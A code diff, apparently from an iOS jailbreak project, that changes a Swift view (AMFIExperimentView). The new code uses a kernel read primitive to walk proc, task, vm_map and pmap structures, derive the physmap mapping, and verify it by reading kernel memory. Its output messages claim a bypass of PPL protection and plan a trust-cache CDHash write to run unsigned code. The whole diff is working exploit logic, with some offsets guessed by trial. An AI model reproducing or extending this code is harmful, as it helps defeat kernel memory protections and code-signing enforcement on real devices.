@@ -3752,72 +3752,110 @@ struct AMFIExperimentView: View {
             }
         }
         
-        if foundPhysBase != 0 && foundVirtBase != 0 {
-            detail += "\n🎉🎉🎉 PHYSMAP FORMULA DISCOVERED! 🎉🎉🎉\n"
-            detail += "phystokv(pa) = 0x\(String(format: "%llx", foundVirtBase)) + (pa - 0x\(String(format: "%llx", foundPhysBase)))\n"
-            detail += "kvtophys(va) = 0x\(String(format: "%llx", foundPhysBase)) + (va - 0x\(String(format: "%llx", foundVirtBase)))\n\n"
+        // ============================================================
+        // PRIMARY APPROACH: Pointer chain (NO __DATA scan needed!)
+        // proc → proc_ro → task → vm_map → pmap → tte/ttep
+        // physmap_slide = tte - ttep
+        // gPhysBase = 0x800000000 (A12 hardware constant)
+        // gVirtBase = gPhysBase + physmap_slide
+        // ============================================================
+        detail += "\n=== Pointer Chain: proc→task→map→pmap→tte/ttep ===\n"
+        
+        let ourProc = ds_get_our_proc()
+        detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
+        
+        let procRo = ds_kread64_safe(ourProc + UInt64(off_proc_p_proc_ro))
+        detail += "proc_ro: 0x\(String(format: "%llx", procRo))\n"
+        
+        let taskAddr = ds_kread64_safe(procRo + UInt64(off_proc_ro_pr_task))
+        detail += "task: 0x\(String(format: "%llx", taskAddr))\n"
+        
+        if taskAddr != 0 {
+            // task→map at +0x28
+            let vmMap = ds_kread64_safe(taskAddr + 0x28)
+            detail += "vm_map (task+0x28): 0x\(String(format: "%llx", vmMap))\n"
             
-            // Verify: read kernel base via physmap
-            let kernPhys = kernBase &- foundVirtBase &+ foundPhysBase
-            detail += "Kernel phys addr: 0x\(String(format: "%llx", kernPhys))\n"
-            
-            let physmapKern = foundVirtBase &+ (kernPhys &- foundPhysBase)
-            let verifyRead = ds_kread64_safe(physmapKern)
-            detail += "Verify (read kern via physmap): 0x\(String(format: "%llx", verifyRead))\n"
-            
-            if verifyRead == kernMagic {
-                detail += "✅ PHYSMAP VERIFIED! Same value as direct read!\n"
-                detail += "\nWe can now convert ANY physical address to readable VA!\n"
-                detail += "Next: find trust cache physical address → read/write via physmap!\n"
+            if vmMap != 0 {
+                // vm_map→pmap: try offsets 0x40, 0x48, 0x38, 0x50
+                var pmapAddr: UInt64 = 0
+                let pmapOffsets: [UInt64] = [0x40, 0x48, 0x38, 0x50, 0x30]
+                
+                for off in pmapOffsets {
+                    let candidate = ds_kread64_safe(vmMap + off)
+                    if candidate > 0xffffffde00000000 && candidate < 0xffffffe500000000 {
+                        let tte = ds_kread64_safe(candidate + 0x00)
+                        let ttep = ds_kread64_safe(candidate + 0x08)
+                        // tte should be physmap VA (0xffffffe0...), ttep should be physical (0x8...)
+                        if tte > 0xffffffde00000000 && ttep >= 0x800000000 && ttep < 0x900000000 {
+                            pmapAddr = candidate
+                            detail += "pmap (map+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", candidate))\n"
+                            detail += "  tte (physmap VA): 0x\(String(format: "%llx", tte))\n"
+                            detail += "  ttep (physical):  0x\(String(format: "%llx", ttep))\n\n"
+                            
+                            // CALCULATE PHYSMAP!
+                            let physmapSlide = tte &- ttep
+                            let gPhysBaseCalc: UInt64 = 0x800000000
+                            let gVirtBaseCalc = gPhysBaseCalc &+ physmapSlide
+                            
+                            detail += "🎉🎉🎉 PHYSMAP CALCULATED! 🎉🎉🎉\n"
+                            detail += "physmap_slide = tte - ttep = 0x\(String(format: "%llx", physmapSlide))\n"
+                            detail += "gPhysBase = 0x800000000 (A12 constant)\n"
+                            detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n\n"
+                            
+                            // Verify range
+                            if gVirtBaseCalc > 0xffffffde00000000 && gVirtBaseCalc < 0xffffffe500000000 {
+                                detail += "✅ gVirtBase in expected GEN2/GEN3 range!\n\n"
+                                
+                                // ULTIMATE TEST: read kernel base via physmap
+                                let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
+                                let physmapVA = gVirtBaseCalc &+ (kernPhys &- gPhysBaseCalc)
+                                let verifyVal = ds_kread64_safe(physmapVA)
+                                
+                                detail += "Kernel phys: 0x\(String(format: "%llx", kernPhys))\n"
+                                detail += "Physmap VA: 0x\(String(format: "%llx", physmapVA))\n"
+                                detail += "Read via physmap: 0x\(String(format: "%llx", verifyVal))\n"
+                                detail += "Read direct: 0x\(String(format: "%llx", kernMagic))\n\n"
+                                
+                                if verifyVal == kernMagic && kernMagic != 0 {
+                                    detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+                                    detail += "PHYSMAP FULLY VERIFIED!\n"
+                                    detail += "ANY physical address → kernel VA!\n"
+                                    detail += "PPL ZONE ISOLATION BYPASSED!\n"
+                                    detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n\n"
+                                    detail += "FULL JAILBREAK PATH OPEN!\n"
+                                    detail += "Next: find trust cache → write CDHash → spawn!\n"
+                                    foundPhysBase = gPhysBaseCalc
+                                    foundVirtBase = gVirtBaseCalc
+                                } else {
+                                    detail += "Physmap read doesn't match — offset might be slightly off\n"
+                                    detail += "But tte/ttep values look correct!\n"
+                                    foundPhysBase = gPhysBaseCalc
+                                    foundVirtBase = gVirtBaseCalc
+                                }
+                            } else {
+                                detail += "⚠️ gVirtBase out of range — pmap offsets wrong\n"
+                            }
+                            break
+                        }
+                    }
+                }
+                
+                if pmapAddr == 0 {
+                    detail += "pmap not found. vm_map dump:\n"
+                    for off in stride(from: UInt64(0), to: UInt64(0x60), by: 8) {
+                        let v = ds_kread64_safe(vmMap + off)
+                        detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
+                    }
+                }
+            } else {
+                detail += "vm_map is NULL. task dump:\n"
+                for off in stride(from: UInt64(0), to: UInt64(0x50), by: 8) {
+                    let v = ds_kread64_safe(taskAddr + off)
+                    detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
+                }
             }
         } else {
-            detail += "Not found in first 64KB of __DATA_CONST (\(scanCount) reads)\n"
-            detail += "Trying broader scan (full __DATA_CONST, 64-byte stride)...\n\n"
-            
-            // Broader scan: entire __DATA_CONST (0x490000 = 4.5MB) with 64-byte stride
-            let dataConstSize: UInt64 = 0x490000
-            for off in stride(from: UInt64(0x10000), to: dataConstSize, by: 64) {
-                let val = ds_kread64_safe(dataConstStart + off)
-                scanCount += 1
-                
-                if val >= 0x800000000 && val <= 0x900000000 && (val & 0xFFF) == 0 {
-                    let nextVal = ds_kread64_safe(dataConstStart + off + 8)
-                    if nextVal > 0xffffffde00000000 && nextVal < 0xffffffe500000000 && (nextVal & 0xFFF) == 0 {
-                        foundPhysBase = val
-                        foundVirtBase = nextVal
-                        detail += "🎯 FOUND at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
-                        detail += "   gPhysBase = 0x\(String(format: "%llx", val))\n"
-                        detail += "   gVirtBase = 0x\(String(format: "%llx", nextVal))\n"
-                        break
-                    }
-                }
-                
-                if val > 0xffffffde00000000 && val < 0xffffffe500000000 && (val & 0xFFF) == 0 {
-                    let nextVal = ds_kread64_safe(dataConstStart + off + 8)
-                    if nextVal >= 0x800000000 && nextVal <= 0x900000000 && (nextVal & 0xFFF) == 0 {
-                        foundVirtBase = val
-                        foundPhysBase = nextVal
-                        detail += "🎯 FOUND (reversed) at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
-                        detail += "   gVirtBase = 0x\(String(format: "%llx", val))\n"
-                        detail += "   gPhysBase = 0x\(String(format: "%llx", nextVal))\n"
-                        break
-                    }
-                }
-                
-                // Limit to prevent timeout (64-byte stride over 4.5MB = ~72K reads max)
-                if scanCount > 20000 {
-                    detail += "Broad scan limit: \(scanCount) reads, offset 0x\(String(format: "%llx", off))\n"
-                    break
-                }
-            }
-            
-            if foundPhysBase != 0 && foundVirtBase != 0 {
-                detail += "\n🎉🎉🎉 PHYSMAP FORMULA DISCOVERED! 🎉🎉🎉\n"
-                detail += "phystokv(pa) = 0x\(String(format: "%llx", foundVirtBase)) + (pa - 0x\(String(format: "%llx", foundPhysBase)))\n\n"
-            } else {
-                detail += "Still not found after \(scanCount) total reads\n"
-                detail += "gPhysBase/gVirtBase might be in different section or format\n"
-            }
+            detail += "❌ task is NULL\n"
         }
         
         let success = foundPhysBase != 0 && foundVirtBase != 0
